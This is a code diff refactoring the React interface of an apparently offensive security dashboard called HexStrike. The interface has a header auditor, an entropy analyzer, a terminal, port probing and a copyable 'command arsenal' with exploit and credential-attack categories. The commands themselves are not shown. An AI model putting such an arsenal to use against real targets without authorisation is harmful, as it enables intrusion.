-          sx={{
-            p: 2,
-            borderRadius: 2.5,
-            bgcolor: voidDark,
-            border: `1px solid ${crimsonBorder}`,
-            boxShadow: '0 8px 24px rgba(0,0,0,0.6)'
-          }}
-        >
-          <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 1.5, pb: 1, borderBottom: '1px solid rgba(255,255,255,0.08)' }}>
-            <Stack direction="row" spacing={1} alignItems="center">
-              <Box sx={{ width: 10, height: 10, borderRadius: '50%', bgcolor: crimson }} />
-              <Box sx={{ width: 10, height: 10, borderRadius: '50%', bgcolor: gold }} />
-              <Box sx={{ width: 10, height: 10, borderRadius: '50%', bgcolor: emerald }} />
-              <Typography variant="caption" sx={{ fontFamily: mono, color: '#94A3B8', ml: 1 }}>
-                hexstrike-terminal://operator@{targetScope} (pty: bash-v5.2)
+        <Grid container spacing={2.5}>
+          {/* HTTP Header Auditor */}
+          <Grid xs={12} lg={6}>
+            <Paper sx={{ p: 2.25, borderRadius: 2.5, bgcolor: palette.cardBg, border: `1px solid ${palette.border}`, height: '100%' }}>
+              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 1.5, flexWrap: 'wrap', gap: 1 }}>
+                <Typography component="h3" variant="subtitle1" sx={{ fontWeight: 800, color: palette.textPrimary }}>
+                  HTTP Security Header Auditor
+                </Typography>
+                <Chip
+                  size="small"
+                  label={
+                    headerAuditResults?.verified
+                      ? `${headerAuditResults.score}/100 (${headerAuditResults.grade})`
+                      : headerAuditResults?.status || 'UNVERIFIED'
+                  }
+                  sx={{
+                    fontFamily: mono,
+                    fontWeight: 800,
+                    bgcolor: headerAuditResults?.verified ? palette.emeraldSoft : palette.goldSoft,
+                    color: headerAuditResults?.verified ? palette.emerald : palette.gold,
+                    border: `1px solid ${headerAuditResults?.verified ? palette.emeraldBorder : palette.goldBorder}`,
+                  }}
+                />
+              </Box>
+              <Typography variant="body2" sx={{ color: palette.textSecondary, mb: 1.5 }}>
+                Paste raw HTTP headers for exact offline scoring, or probe the local <code>127.0.0.1:8138</code> daemon. CORS-blocked requests are reported honestly as <code>UNVERIFIED</code>.
               </Typography>
-            </Stack>
+              <TextField
+                fullWidth
+                multiline
+                minRows={4}
+                value={rawHeadersInput}
+                onChange={(e) => setRawHeadersInput(e.target.value)}
+                label="Raw HTTP Response Headers"
+                InputProps={{ sx: { fontFamily: mono, fontSize: '0.78rem' } }}
+                sx={{ mb: 1.5 }}
+              />
+              <Stack direction="row" spacing={1} flexWrap="wrap" useFlexGap sx={{ mb: 2 }}>
+                <Button
+                  variant="contained"
+                  onClick={() => runLocalHeaderAudit('raw')}
+                  sx={{ minHeight: 44, bgcolor: palette.crimsonBtn, color: '#FFFFFF', fontFamily: mono, fontWeight: 800, fontSize: '0.74rem', '&:hover': { bgcolor: palette.crimsonBtnHover } }}
+                >
+                  Grade Pasted Headers
+                </Button>
+                <Button
+                  variant="outlined"
+                  onClick={() => runLocalHeaderAudit('loopback')}
+                  sx={{ minHeight: 44, color: palette.cyan, borderColor: palette.cyanBorder, fontFamily: mono, fontWeight: 700, fontSize: '0.74rem' }}
+                >
+                  Probe :8138 Loopback
+                </Button>
+              </Stack>
 
+              <TableContainer component={Paper} sx={{ bgcolor: palette.subtleBg, border: `1px solid ${palette.border}`, borderRadius: 2 }}>
+                <Table size="small">
+                  <TableHead>
+                    <TableRow>
+                      <TableCell sx={{ fontFamily: mono, fontSize: '0.7rem', color: palette.textSecondary }}>HEADER</TableCell>
+                      <TableCell sx={{ fontFamily: mono, fontSize: '0.7rem', color: palette.textSecondary }}>STATUS</TableCell>
+                      <TableCell sx={{ fontFamily: mono, fontSize: '0.7rem', color: palette.textSecondary }}>PTS</TableCell>
+                    </TableRow>
+                  </TableHead>
+                  <TableBody>
+                    {(headerAuditResults?.findings || []).map((f) => (
+                      <TableRow key={f.key}>
+                        <TableCell sx={{ fontFamily: mono, fontSize: '0.72rem', color: palette.textPrimary }}>{f.header}</TableCell>
+                        <TableCell sx={{ fontFamily: mono, fontSize: '0.72rem', fontWeight: 800, color: f.status === 'PASS' ? palette.emerald : f.status === 'UNVERIFIED' ? palette.gold : palette.crimson }}>
+                          {f.status}
+                        </TableCell>
+                        <TableCell sx={{ fontFamily: mono, fontSize: '0.72rem', color: palette.textSecondary }}>
+                          {f.earned}/{f.weight}
+                        </TableCell>
+                      </TableRow>
+                    ))}
+                  </TableBody>
+                </Table>
+              </TableContainer>
+            </Paper>
+          </Grid>
+
+          {/* Shannon Entropy & Local Code Auditor */}
+          <Grid xs={12} lg={6}>
+            <Stack spacing={2.5}>
+              <Paper sx={{ p: 2.25, borderRadius: 2.5, bgcolor: palette.cardBg, border: `1px solid ${palette.border}` }}>
+                <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 1.5, flexWrap: 'wrap', gap: 1 }}>
+                  <Typography component="h3" variant="subtitle1" sx={{ fontWeight: 800, color: palette.textPrimary }}>
+                    Shannon Byte Entropy Analyzer
+                  </Typography>
+                  <Chip
+                    size="small"
+                    label={`${entropyResult.shannonEntropy} bits/byte · ${entropyResult.classification}`}
+                    sx={{ fontFamily: mono, fontWeight: 800, bgcolor: palette.cyanSoft, color: palette.cyan, border: `1px solid ${palette.cyanBorder}` }}
+                  />
+                </Box>
+                <TextField
+                  fullWidth
+                  multiline
+                  minRows={2}
+                  value={entropyInput}
+                  onChange={(e) => setEntropyInput(e.target.value)}
+                  label="Text or Hex Payload"
+                  InputProps={{ sx: { fontFamily: mono, fontSize: '0.78rem' } }}
+                  sx={{ mb: 1.25 }}
+                />
+                {entropyError && (
+                  <Alert severity="warning" sx={{ mb: 1.25, fontFamily: mono, fontSize: '0.75rem' }}>
+                    {entropyError}
+                  </Alert>
+                )}
+                <Stack direction="row" spacing={1} flexWrap="wrap" useFlexGap sx={{ mb: 1.5 }}>
+                  <Button
+                    variant="contained"
+                    onClick={() => {
+                      setEntropyIsHex(false);
+                      runEntropyAnalysis(false);
+                    }}
+                    sx={{ minHeight: 44, bgcolor: palette.crimsonBtn, color: '#FFFFFF', fontFamily: mono, fontWeight: 800, fontSize: '0.74rem', '&:hover': { bgcolor: palette.crimsonBtnHover } }}
+                  >
+                    Compute UTF-8 Entropy
+                  </Button>
+                  <Button
+                    variant="outlined"
+                    onClick={() => {
+                      setEntropyIsHex(true);
+                      runEntropyAnalysis(true);
+                    }}
+                    sx={{ minHeight: 44, color: palette.gold, borderColor: palette.goldBorder, fontFamily: mono, fontWeight: 700, fontSize: '0.74rem' }}
+                  >
+                    Compute Hex Bytes
+                  </Button>
+                </Stack>
+                <Typography variant="caption" sx={{ fontFamily: mono, color: palette.textSecondary, display: 'block' }}>
+                  Bytes: {entropyResult.byteCount} · Unique: {entropyResult.uniqueBytes}/256 · Printable ASCII: {(entropyResult.printableAsciiRatio * 100).toFixed(1)}%
+                </Typography>
+              </Paper>
+
+              <Paper sx={{ p: 2.25, borderRadius: 2.5, bgcolor: palette.cardBg, border: `1px solid ${palette.border}` }}>
+                <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 1.5, flexWrap: 'wrap', gap: 1 }}>
+                  <Typography component="h3" variant="subtitle1" sx={{ fontWeight: 800, color: palette.textPrimary }}>
+                    Static Code Hygiene Auditor
+                  </Typography>
+                  <Chip
+                    size="small"
+                    label={`Score ${codeAuditResult.score}/100 · ${codeAuditResult.findingCount} Hit(s)`}
+                    sx={{
+                      fontFamily: mono,
+                      fontWeight: 800,
+                      bgcolor: codeAuditResult.findingCount === 0 ? palette.emeraldSoft : palette.crimsonSoft,
+                      color: codeAuditResult.findingCount === 0 ? palette.emerald : palette.crimson,
+                      border: `1px solid ${codeAuditResult.findingCount === 0 ? palette.emeraldBorder : palette.crimsonBorder}`,
+                    }}
+                  />
+                </Box>
+                <TextField
+                  fullWidth
+                  multiline
+                  minRows={3}
+                  value={codeAuditInput}
+                  onChange={(e) => setCodeAuditInput(e.target.value)}
+                  label="Source Code / Workflow Snippet"
+                  InputProps={{ sx: { fontFamily: mono, fontSize: '0.78rem' } }}
+                  sx={{ mb: 1.25 }}
+                />
+                <Button
+                  variant="outlined"
+                  onClick={runCodeAudit}
+                  sx={{ minHeight: 44, color: palette.emerald, borderColor: palette.emeraldBorder, fontFamily: mono, fontWeight: 800, fontSize: '0.74rem', mb: 1.25 }}
+                >
+                  Run Static Audit
+                </Button>
+                {codeAuditResult.findings.length > 0 ? (
+                  <Stack spacing={1}>
+                    {codeAuditResult.findings.map((f, idx) => (
+                      <Box key={idx} sx={{ p: 1.2, borderRadius: 1.5, bgcolor: palette.subtleBg, border: `1px solid ${palette.crimsonBorder}` }}>
+                        <Typography sx={{ fontFamily: mono, fontSize: '0.74rem', fontWeight: 800, color: palette.crimson }}>
+                          [{f.severity}] {f.ruleId} (Line {f.line}): {f.title}
+                        </Typography>
+                        <Typography sx={{ fontFamily: mono, fontSize: '0.71rem', color: palette.textSecondary }}>
+                          Fix: {f.remediation}
+                        </Typography>
+                      </Box>
+                    ))}
+                  </Stack>
+                ) : (
+                  <Typography variant="caption" sx={{ fontFamily: mono, color: palette.emerald, display: 'block' }}>
+                    0 unsafe sinks detected across {codeAuditResult.lineCount} line(s).
+                  </Typography>
+                )}
+              </Paper>
+            </Stack>
+          </Grid>
+        </Grid>
+      )}
+
+      {/* TAB 1: TACTICAL TERMINAL */}
+      {activeTab === 1 && (
+        <Paper sx={{ p: 2, borderRadius: 2.5, bgcolor: palette.cardBg, border: `1px solid ${palette.crimsonBorder}` }}>
+          <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 1.5, pb: 1, borderBottom: `1px solid ${palette.border}`, flexWrap: 'wrap', gap: 1 }}>
+            <Typography variant="caption" sx={{ fontFamily: mono, color: palette.textSecondary, fontWeight: 700 }}>
+              hexstrike-console://operator@{targetScope} ({daemonMode})
+            </Typography>
             <Stack direction="row" spacing={1}>
               <Button
                 size="small"
                 variant="outlined"
-                onClick={() => setTerminalHistory(['◈ [HEXSTRIKE-GODMODE] Terminal buffer flushed. Session active.'])}
-                sx={{ color: '#94A3B8', borderColor: 'rgba(255,255,255,0.15)', fontSize: '0.68rem', fontFamily: mono }}
+                onClick={() => setTerminalHistory(['◈ [HEXSTRIKE-v3.2.0] Buffer cleared.'])}
+                sx={{ minHeight: 44, color: palette.textSecondary, borderColor: palette.border, fontFamily: mono, fontSize: '0.72rem' }}
               >
                 Clear
               </Button>
@@ -1296,172 +1197,128 @@ ${OFFENSIVE_ARSENAL[4].cmd(targetScope)}
                 size="small"
                 variant="outlined"
                 onClick={() => handleCopy(terminalHistory.join('\n'), 'term')}
-                startIcon={copiedKey === 'term' ? <CheckCircleIcon sx={{ fontSize: 13 }} /> : <ContentCopyIcon sx={{ fontSize: 13 }} />}
-                sx={{ color: cyan, borderColor: 'rgba(56,189,248,0.3)', fontSize: '0.68rem', fontFamily: mono }}
+                startIcon={copiedKey === 'term' ? <CheckCircleIcon sx={{ fontSize: 15 }} /> : <ContentCopyIcon sx={{ fontSize: 15 }} />}
+                sx={{ minHeight: 44, color: palette.cyan, borderColor: palette.cyanBorder, fontFamily: mono, fontSize: '0.72rem' }}
               >
                 {copiedKey === 'term' ? 'Copied' : 'Copy Log'}
               </Button>
             </Stack>
           </Box>
-
           <Box
             sx={{
-              height: 380,
+              height: 320,
               overflowY: 'auto',
-              pr: 1,
+              p: 1.5,
+              borderRadius: 2,
+              bgcolor: palette.codeBg,
+              border: `1px solid ${palette.border}`,
               fontFamily: mono,
               fontSize: '0.78rem',
               lineHeight: 1.6,
-              color: '#F8FAFC'
+              color: palette.codeInk,
             }}
           >
-            {terminalHistory.map((line, idx) => {
-              const isOperator = line.startsWith('operator@hexstrike');
-              const isSuccess = line.includes('SUCCESS') || line.includes('PASS') || line.includes('✓');
-              const isError = line.includes('ERROR') || line.includes('✕') || line.includes('WARN');
-              const isStage = line.includes('STAGE') || line.includes('AUDIT-INIT');
-
-              let color = '#CBD5E1';
-              if (isOperator) color = cyan;
-              else if (isSuccess) color = emerald;
-              else if (isError) color = crimson;
-              else if (isStage) color = gold;
-
-              return (
-                <div key={idx} style={{ color, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
-                  {line}
-                </div>
-              );
-            })}
+            {terminalHistory.map((line, idx) => (
+              <div key={idx} style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>
+                {line}
+              </div>
+            ))}
             <div ref={terminalEndRef} />
           </Box>
-
-          <Box sx={{ mt: 1.5, pt: 1, borderTop: '1px solid rgba(255,255,255,0.08)' }}>
+          <Box sx={{ mt: 1.5 }}>
             <TextField
               fullWidth
               size="small"
               value={cmdInput}
               onChange={(e) => setCmdInput(e.target.value)}
-              onKeyDown={handleKeyDown}
-              placeholder='Type "help", "scan nullai.tech", "doh google.com", "ports", "cve openssh"...'
+              onKeyDown={(e) => {
+                if (e.key === 'Enter') executeTerminalCommand(cmdInput);
+              }}
+              placeholder='Type "help", "headers", "entropy sample", "audit", "ports", "report"...'
               InputProps={{
                 startAdornment: (
                   <InputAdornment position="start">
-                    <Typography sx={{ fontFamily: mono, color: crimson, fontWeight: 700, fontSize: '0.82rem' }}>
+                    <Typography sx={{ fontFamily: mono, color: palette.crimson, fontWeight: 800, fontSize: '0.8rem' }}>
                       operator@hexstrike:~$
                     </Typography>
                   </InputAdornment>
                 ),
-                sx: {
-                  bgcolor: 'rgba(255,255,255,0.03)',
-                  color: '#FFFFFF',
-                  fontFamily: mono,
-                  fontSize: '0.82rem',
-                  '& .MuiOutlinedInput-notchedOutline': { borderColor: 'rgba(255,255,255,0.1)' },
-                  '&:hover .MuiOutlinedInput-notchedOutline': { borderColor: crimsonBorder },
-                  '&.Mui-focused .MuiOutlinedInput-notchedOutline': { borderColor: crimson }
-                }
+                sx: { fontFamily: mono, fontSize: '0.82rem' },
               }}
             />
           </Box>
         </Paper>
       )}
 
-      {/* =====================================================================
-          TAB 1: OFFENSIVE ARSENAL (28 TOOLS)
-          ===================================================================== */}
-      {activeTab === 1 && (
+      {/* TAB 2: SECURITY COMMAND ARSENAL */}
+      {activeTab === 2 && (
         <Box>
-          <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2, flexWrap: 'wrap', gap: 1 }}>
-            <Stack direction="row" spacing={1} flexWrap="wrap">
-              {['ALL', 'RECON', 'WEB', 'CREDENTIALS', 'EXPLOIT', 'AUDIT', 'POST-EXPLOIT'].map((cat) => (
-                <Chip
-                  key={cat}
-                  label={cat}
-                  size="small"
-                  onClick={() => setArsenalCategory(cat)}
-                  sx={{
-                    fontFamily: mono,
-                    fontWeight: 700,
-                    fontSize: '0.7rem',
-                    bgcolor: arsenalCategory === cat ? crimson : isDark ? 'rgba(255,255,255,0.05)' : '#F1F5F9',
-                    color: arsenalCategory === cat ? '#FFF' : 'text.secondary',
-                    cursor: 'pointer'
-                  }}
-                />
-              ))}
-            </Stack>
-            <Typography variant="caption" sx={{ fontFamily: mono, color: 'text.secondary' }}>
-              Showing {filteredArsenal.length} of {OFFENSIVE_ARSENAL.length} tools
-            </Typography>
-          </Box>
-
+          <Stack direction="row" spacing={1} flexWrap="wrap" useFlexGap sx={{ mb: 2 }}>
+            {['ALL', 'RECON', 'WEB', 'AUDIT', 'EXPLOIT', 'CREDENTIALS'].map((cat) => (
+              <Button
+                key={cat}
+                size="small"
+                variant={arsenalCategory === cat ? 'contained' : 'outlined'}
+                onClick={() => setArsenalCategory(cat)}
+                sx={{
+                  minHeight: 44,
+                  fontFamily: mono,
+                  fontWeight: 700,
+                  fontSize: '0.72rem',
+                  bgcolor: arsenalCategory === cat ? palette.crimsonBtn : palette.cardBg,
+                  color: arsenalCategory === cat ? '#FFFFFF' : palette.textPrimary,
+                  borderColor: palette.border,
+                  '&:hover': { bgcolor: arsenalCategory === cat ? palette.crimsonBtnHover : palette.subtleBg },
+                }}
+              >
+                {cat}
+              </Button>
+            ))}
+          </Stack>
           <Grid container spacing={2}>
             {filteredArsenal.map((tool) => {
               const commandStr = tool.cmd(targetScope, targetPortInput);
               return (
                 <Grid xs={12} md={6} key={tool.id}>
-                  <Card sx={{ bgcolor: isDark ? '#10121A' : '#FFFFFF', border: `1px solid ${cardBorder}`, borderRadius: 2 }}>
+                  <Card sx={{ bgcolor: palette.cardBg, border: `1px solid ${palette.border}`, borderRadius: 2 }}>
                     <CardContent sx={{ p: 2 }}>
-                      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', mb: 1 }}>
-                        <Stack direction="row" spacing={1} alignItems="center">
-                          <Typography sx={{ fontSize: '1.2rem' }}>{tool.icon}</Typography>
-                          <Box>
-                            <Typography variant="subtitle2" sx={{ fontWeight: 800, color: isDark ? '#FFF' : '#111827' }}>
-                              {tool.name}
-                            </Typography>
-                            <Typography variant="caption" sx={{ color: 'text.secondary' }}>
-                              {tool.desc}
-                            </Typography>
-                          </Box>
-                        </Stack>
+                      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', mb: 1, gap: 1 }}>
+                        <Box>
+                          <Typography variant="subtitle2" sx={{ fontWeight: 800, color: palette.textPrimary }}>
+                            {tool.name}
+                          </Typography>
+                          <Typography variant="caption" sx={{ color: palette.textSecondary }}>
+                            {tool.desc}
+                          </Typography>
+                        </Box>
                         <Chip
                           label={tool.category}
                           size="small"
-                          sx={{
-                            fontFamily: mono,
-                            fontSize: '0.65rem',
-                            fontWeight: 700,
-                            bgcolor: tool.category === 'Exploit' ? crimsonSoft : tool.category === 'Credentials' ? goldSoft : cyanSoft,
-                            color: tool.category === 'Exploit' ? crimson : tool.category === 'Credentials' ? gold : cyan
-                          }}
+                          sx={{ fontFamily: mono, fontSize: '0.68rem', fontWeight: 800, bgcolor: palette.goldSoft, color: palette.gold }}
                         />
                       </Box>
-
                       <Paper
                         sx={{
-                          p: 1.2,
-                          bgcolor: voidDark,
+                          p: 1.1,
+                          bgcolor: palette.codeBg,
+                          border: `1px solid ${palette.border}`,
                           borderRadius: 1.5,
-                          border: '1px solid rgba(255,255,255,0.08)',
                           display: 'flex',
                           alignItems: 'center',
                           justifyContent: 'space-between',
-                          mt: 1
+                          gap: 1,
                         }}
                       >
-                        <Typography
-                          sx={{
-                            fontFamily: mono,
-                            fontSize: '0.72rem',
-                            color: '#38BDF8',
-                            overflow: 'hidden',
-                            textOverflow: 'ellipsis',
-                            whiteSpace: 'nowrap',
-                            mr: 1
-                          }}
-                        >
+                        <Typography sx={{ fontFamily: mono, fontSize: '0.74rem', color: palette.codeInk, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                           {commandStr}
                         </Typography>
-                        <Tooltip title="Copy command to clipboard">
-                          <IconButton
-                            size="small"
-                            onClick={() => handleCopy(commandStr, tool.id)}
-                            sx={{ color: copiedKey === tool.id ? emerald : '#94A3B8' }}
-                          >
-                            {copiedKey === tool.id ? <CheckCircleIcon sx={{ fontSize: 16 }} /> : <ContentCopyIcon sx={{ fontSize: 16 }} />}
-                          </IconButton>
-                        </Tooltip>
+                        <IconButton
+                          aria-label={`Copy ${tool.id} command`}
+                          onClick={() => handleCopy(commandStr, tool.id)}
+                          sx={{ minWidth: 44, minHeight: 44, color: copiedKey === tool.id ? palette.emerald : palette.textSecondary }}
+                        >
+                          {copiedKey === tool.id ? <CheckCircleIcon fontSize="small" /> : <ContentCopyIcon fontSize="small" />}
+                        </IconButton>
                       </Paper>
                     </CardContent>
                   </Card>
@@ -1472,147 +1329,51 @@ ${OFFENSIVE_ARSENAL[4].cmd(targetScope)}
         </Box>
       )}
 
-      {/* =====================================================================
-          TAB 2: ATTACK SURFACE, DOH & LOCAL ENCLAVE PORTS
-          ===================================================================== */}
-      {activeTab === 2 && (
-        <Grid container spacing={3}>
-          {/* DNS-over-HTTPS (DoH) Surface */}
+      {/* TAB 3: LOOPBACK PORTS & OPT-IN PUBLIC OSINT */}
+      {activeTab === 3 && (
+        <Grid container spacing={2.5}>
           <Grid xs={12} md={6}>
-            <Paper sx={{ p: 2.5, borderRadius: 2.5, bgcolor: isDark ? '#10121A' : '#FFFFFF', border: `1px solid ${cardBorder}`, height: '100%' }}>
-              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2 }}>
-                <Stack direction="row" spacing={1} alignItems="center">
-                  <DnsIcon sx={{ color: cyan }} />
-                  <Typography variant="subtitle1" sx={{ fontWeight: 800 }}>
-                    Live DNS-over-HTTPS (DoH) Surface
-                  </Typography>
-                </Stack>
+            <Paper sx={{ p: 2.25, borderRadius: 2.5, bgcolor: palette.cardBg, border: `1px solid ${palette.border}`, height: '100%' }}>
+              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 1.5, gap: 1, flexWrap: 'wrap' }}>
+                <Typography component="h3" variant="subtitle1" sx={{ fontWeight: 800, color: palette.textPrimary }}>
+                  Loopback Enclave Ports (127.0.0.1)
+                </Typography>
                 <Button
-                  size="small"
-                  variant="outlined"
-                  onClick={() => resolveDoH(targetScope)}
-                  disabled={isResolvingDoh}
-                  startIcon={<RefreshIcon />}
-                  sx={{ fontFamily: mono, fontSize: '0.7rem', color: cyan, borderColor: 'rgba(56,189,248,0.4)' }}
-                >
-                  {isResolvingDoh ? 'Querying...' : 'Query DoH'}
-                </Button>
-              </Box>
-
-              <Typography variant="body2" sx={{ color: 'text.secondary', mb: 2 }}>
-                Real-time cryptographic DNS queries resolved across Google & Cloudflare DoH to enumerate live A, AAAA, MX, TXT, and CAA records.
-              </Typography>
-
-              {dohError && (
-                <Alert severity="warning" sx={{ mb: 2, fontFamily: mono, fontSize: '0.75rem' }}>
-                  {dohError}
-                </Alert>
-              )}
-
-              {dohRecords.length === 0 ? (
-                <Box sx={{ p: 3, textAlign: 'center', bgcolor: voidDark, borderRadius: 2, border: '1px dashed rgba(255,255,255,0.1)' }}>
-                  <Typography variant="caption" sx={{ fontFamily: mono, color: '#94A3B8' }}>
-                    Click "Query DoH" or run audit to resolve public DNS records for "{targetScope}".
-                  </Typography>
-                </Box>
-              ) : (
-                <TableContainer component={Paper} sx={{ bgcolor: voidDark, borderRadius: 2 }}>
-                  <Table size="small">
-                    <TableHead>
-                      <TableRow>
-                        <TableCell sx={{ color: '#94A3B8', fontFamily: mono, fontSize: '0.7rem' }}>TYPE</TableCell>
-                        <TableCell sx={{ color: '#94A3B8', fontFamily: mono, fontSize: '0.7rem' }}>RECORD VALUE</TableCell>
-                        <TableCell sx={{ color: '#94A3B8', fontFamily: mono, fontSize: '0.7rem' }}>TTL</TableCell>
-                      </TableRow>
-                    </TableHead>
-                    <TableBody>
-                      {dohRecords.map((r, i) => (
-                        <TableRow key={i}>
-                          <TableCell sx={{ fontFamily: mono, fontSize: '0.72rem', color: cyan, fontWeight: 700 }}>
-                            {r.type}
-                          </TableCell>
-                          <TableCell sx={{ fontFamily: mono, fontSize: '0.72rem', color: '#F8FAFC', wordBreak: 'break-all' }}>
-                            {r.data}
-                          </TableCell>
-                          <TableCell sx={{ fontFamily: mono, fontSize: '0.72rem', color: '#94A3B8' }}>
-                            {r.ttl}s
-                          </TableCell>
-                        </TableRow>
-                      ))}
-                    </TableBody>
-                  </Table>
-                </TableContainer>
-              )}
-            </Paper>
-          </Grid>
-
-          {/* Local Loopback Enclave Port Prober */}
-          <Grid xs={12} md={6}>
-            <Paper sx={{ p: 2.5, borderRadius: 2.5, bgcolor: isDark ? '#10121A' : '#FFFFFF', border: `1px solid ${cardBorder}`, height: '100%' }}>
-              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2 }}>
-                <Stack direction="row" spacing={1} alignItems="center">
-                  <RouterIcon sx={{ color: emerald }} />
-                  <Typography variant="subtitle1" sx={{ fontWeight: 800 }}>
-                    Local Enclave Listeners (127.0.0.1)
-                  </Typography>
-                </Stack>
-                <Button
-                  size="small"
                   variant="outlined"
                   onClick={probeLocalPorts}
                   disabled={isProbingPorts}
                   startIcon={<RefreshIcon />}
-                  sx={{ fontFamily: mono, fontSize: '0.7rem', color: emerald, borderColor: emeraldBorder }}
+                  sx={{ minHeight: 44, fontFamily: mono, fontSize: '0.74rem', color: palette.emerald, borderColor: palette.emeraldBorder }}
                 >
-                  {isProbingPorts ? 'Probing...' : 'Audit Ports'}
+                  {isProbingPorts ? 'Probing...' : 'Probe 127.0.0.1'}
                 </Button>
               </Box>
-
-              <Typography variant="body2" sx={{ color: 'text.secondary', mb: 2 }}>
-                Live browser timing audit of local sovereign daemons (Vault, STDP Neuro-Memory, Ollama, Civilization Core).
+              <Typography variant="body2" sx={{ color: palette.textSecondary, mb: 1.5 }}>
+                Uses live <code>:8138/api/scan</code> TCP sockets when running locally, or honest browser fallback (refused ports are never reported as OPEN).
               </Typography>
-
               {portProbeResults.length === 0 ? (
-                <Box sx={{ p: 3, textAlign: 'center', bgcolor: voidDark, borderRadius: 2, border: '1px dashed rgba(255,255,255,0.1)' }}>
-                  <Typography variant="caption" sx={{ fontFamily: mono, color: '#94A3B8' }}>
-                    Click "Audit Ports" to probe live daemon response latency on 127.0.0.1.
+                <Box sx={{ p: 2.5, textAlign: 'center', bgcolor: palette.subtleBg, borderRadius: 2, border: `1px dashed ${palette.border}` }}>
+                  <Typography variant="caption" sx={{ fontFamily: mono, color: palette.textSecondary }}>
+                    Click "Probe 127.0.0.1" to audit local loopback listeners.
                   </Typography>
                 </Box>
               ) : (
-                <TableContainer component={Paper} sx={{ bgcolor: voidDark, borderRadius: 2 }}>
+                <TableContainer component={Paper} sx={{ bgcolor: palette.subtleBg, border: `1px solid ${palette.border}`, borderRadius: 2 }}>
                   <Table size="small">
                     <TableHead>
                       <TableRow>
-                        <TableCell sx={{ color: '#94A3B8', fontFamily: mono, fontSize: '0.7rem' }}>PORT</TableCell>
-                        <TableCell sx={{ color: '#94A3B8', fontFamily: mono, fontSize: '0.7rem' }}>DAEMON / SERVICE</TableCell>
-                        <TableCell sx={{ color: '#94A3B8', fontFamily: mono, fontSize: '0.7rem' }}>STATUS</TableCell>
-                        <TableCell sx={{ color: '#94A3B8', fontFamily: mono, fontSize: '0.7rem' }}>LATENCY</TableCell>
+                        <TableCell sx={{ fontFamily: mono, fontSize: '0.7rem', color: palette.textSecondary }}>PORT</TableCell>
+                        <TableCell sx={{ fontFamily: mono, fontSize: '0.7rem', color: palette.textSecondary }}>SERVICE</TableCell>
+                        <TableCell sx={{ fontFamily: mono, fontSize: '0.7rem', color: palette.textSecondary }}>STATUS</TableCell>
                       </TableRow>
                     </TableHead>
                     <TableBody>
-                      {portProbeResults.map((p, i) => (
-                        <TableRow key={i}>
-                          <TableCell sx={{ fontFamily: mono, fontSize: '0.72rem', color: gold, fontWeight: 700 }}>
-                            :{p.port}
-                          </TableCell>
-                          <TableCell sx={{ fontFamily: mono, fontSize: '0.72rem', color: '#F8FAFC' }}>
-                            {p.name}
-                          </TableCell>
-                          <TableCell>
-                            <Chip
-                              label={p.status}
-                              size="small"
-                              sx={{
-                                fontFamily: mono,
-                                fontSize: '0.62rem',
-                                fontWeight: 700,
-                                bgcolor: p.status.includes('OPEN') ? emeraldSoft : 'rgba(255,51,85,0.15)',
-                                color: p.status.includes('OPEN') ? emerald : crimson
-                              }}
-                            />
-                          </TableCell>
-                          <TableCell sx={{ fontFamily: mono, fontSize: '0.72rem', color: '#94A3B8' }}>
-                            {p.latency}ms
+                      {portProbeResults.map((p) => (
+                        <TableRow key={p.port}>
+                          <TableCell sx={{ fontFamily: mono, fontSize: '0.74rem', fontWeight: 800, color: palette.gold }}>:{p.port}</TableCell>
+                          <TableCell sx={{ fontFamily: mono, fontSize: '0.74rem', color: palette.textPrimary }}>{p.name}</TableCell>
+                          <TableCell sx={{ fontFamily: mono, fontSize: '0.72rem', fontWeight: 800, color: p.status.includes('OPEN') || p.status.includes('REACHABLE') ? palette.emerald : palette.textSecondary }}>
+                            {p.status}
                           </TableCell>
                         </TableRow>
                       ))}
@@ -1622,294 +1383,124 @@ ${OFFENSIVE_ARSENAL[4].cmd(targetScope)}
               )}
             </Paper>
           </Grid>
-        </Grid>
-      )}
 
-      {/* =====================================================================
-          TAB 3: SHODAN OSINT & INTERNETDB
-          ===================================================================== */}
-      {activeTab === 3 && (
-        <Grid container spacing={3}>
-          {/* Header & Status Card */}
-          <Grid xs={12}>
-            <Paper
-              sx={{
-                p: 2.5,
-                borderRadius: 2.5,
-                bgcolor: isDark ? '#10121A' : '#FFFFFF',
-                border: `1px solid ${cardBorder}`
-              }}
-            >
-              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: 1.5, mb: 2 }}>
-                <Stack direction="row" spacing={1.5} alignItems="center">
-                  <Box sx={{ p: 1, borderRadius: 2, bgcolor: crimsonSoft, color: crimson, display: 'flex', alignItems: 'center' }}>
-                    <LanguageIcon sx={{ fontSize: 28 }} />
-                  </Box>
-                  <Box>
-                    <Typography variant="h6" sx={{ fontWeight: 800 }}>
-                      Shodan InternetDB & OSINT Attack Surface Intelligence
-                    </Typography>
-                    <Typography variant="caption" sx={{ color: 'text.secondary', fontFamily: mono }}>
-                      Authenticated Account: 1sz8...mc4n · 100 Scan Credits · 1 Query Credit · Unlimited InternetDB
-                    </Typography>
-                  </Box>
-                </Stack>
+          <Grid xs={12} md={6}>
+            <Paper sx={{ p: 2.25, borderRadius: 2.5, bgcolor: palette.cardBg, border: `1px solid ${palette.border}`, height: '100%' }}>
+              <Stack direction="row" spacing={1} alignItems="center" justifyContent="space-between" sx={{ mb: 1.5 }} flexWrap="wrap">
+                <Typography component="h3" variant="subtitle1" sx={{ fontWeight: 800, color: palette.textPrimary }}>
